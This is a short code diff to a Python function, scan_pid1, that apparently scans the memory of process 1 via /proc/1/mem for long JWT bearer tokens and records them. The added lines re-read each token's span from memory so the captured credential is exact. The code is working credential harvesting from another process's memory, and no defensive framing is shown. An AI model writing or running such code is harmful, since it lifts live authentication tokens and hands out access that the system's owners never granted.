@@ -140,6 +140,18 @@ def scan_pid1():
             for m in JWT_RE.finditer(chunk):
                 tok = m.group(0)
                 if len(tok) >= 600:
+                    # Double-read: re-fetch the exact span from /proc/1/mem to
+                    # guard against concurrent writes flipping bytes between the
+                    # bulk read and this extraction.
+                    tok_start = start + m.start()
+                    tok_len = len(tok)
+                    try:
+                        mem.seek(tok_start)
+                        tok2 = mem.read(tok_len)
+                        if JWT_RE.fullmatch(tok2) and len(tok2) == tok_len:
+                            tok = tok2
+                    except Exception:
+                        pass
                     sha = hashlib.sha256(tok).hexdigest()
                     surface = classify_surface(chunk, m.start(), tok)
                     if sha not in bearers:
